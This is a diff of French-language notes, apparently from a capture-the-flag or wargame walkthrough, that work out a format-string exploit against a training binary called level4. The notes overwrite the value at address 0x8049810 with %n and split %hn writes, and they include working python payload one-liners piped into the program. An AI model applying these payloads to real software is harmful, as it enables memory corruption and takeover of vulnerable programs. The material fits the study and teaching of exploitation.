@@ -52,11 +52,11 @@ Donc la valeur a l'adresse 0x8049810 est mise dans eax
 Ensuite il y a une cmp entre eax et la valeur immediate $0x1025544
 
 On va devoir modifier la valeur a l'adresse 0x8049810
-Sachant que la valeur est 16 millions, peu de chance qu'on puisse ecrire 16m de char pour renvoyer la valeur ecrite par printf
+Sachant que la valeur est ~16 millions, peu de chance qu'on puisse ecrire 16m de char pour renvoyer la valeur ecrite par printf
 Il va falloir trouver une autre solution
 
 Ecrire avec cette notation : %XXXXd. Cela génère un entier de taille XXXX.
-0x1025544 == d16930116
+0x0102 5544 == d16930116
 
 r < <(python -c "print '\x10\x98\x04\x08' + '%16930116c' + '%14$n'")
 
@@ -64,4 +64,7 @@ Ecrire en plusieurs parties avec %hn ? (write short 2 bytes)
 Écrire 0x5544 à l'adresse 0x8049810
 Écrire 0x0102 à l'adresse 0x8049812
 
-r < <(python -c "print '\x10\x98\x04\x08' + '\x12\x98\x04\x08' + '%21828c' + '%14$n' + '%43966c' + '%15$n'")
+r < <(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"')
+
+
+(python -c 'print "\x12\x98\x04\x08" + "\x10\x98\x04\x08" + "%250d" + "%12$hn" + "%21570d" + "%13$hn"'; cat) | ./level4
